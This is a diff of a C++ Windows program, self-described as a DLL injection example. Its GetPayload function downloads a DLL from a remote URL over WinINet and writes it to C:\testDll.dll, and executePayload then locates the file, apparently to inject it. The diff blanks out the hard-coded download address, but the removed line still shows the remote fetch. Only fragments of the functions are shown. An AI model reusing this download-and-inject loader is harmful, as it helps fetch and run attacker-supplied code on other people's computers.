@@ -11,7 +11,7 @@
 #define _CRT_SECURE_NO_WARNINGS
 using namespace std;
 
-//A simple dll example
+//A simple DLL injection example
 
 void GetPayload() {
 	char* fBuffer = NULL;
@@ -25,7 +25,7 @@ void GetPayload() {
 	}
 	else {
 		//if using not relative url use InternetCanonicalizeUrl
-		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "http://brickbullet.com/rmtsrc/testdll.dll", 0, 0, INTERNET_FLAG_RELOAD, 0);
+		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "", 0, 0, INTERNET_FLAG_RELOAD, 0);
 		if (iOpen == NULL) {
 			std::cerr << "could not access resource: " << GetLastErrorAsString();
 		}
@@ -50,7 +50,7 @@ void GetPayload() {
 							cerr << "could not write the file" << GetLastErrorAsString();
 						}
 					}
-					//clean up free memory and close handles
+					//clean up. free memory and close handles
 					delete[] fBuffer;
 					fBuffer = NULL;
 				} while (numberOfBytesRead);
@@ -65,6 +65,7 @@ void GetPayload() {
 
 int executePayload() {
 	WIN32_FIND_DATAA fdata;
+	//get a handle to the file created
 	HANDLE findFile = FindFirstFileA("C:\\testDll.dll", &fdata);
 
 	if (findFile == INVALID_HANDLE_VALUE) {
@@ -113,7 +114,6 @@ int executePayload() {
 	}
 	return 0;
 }
-
 
 int main(int argc, char* argv[])
 {
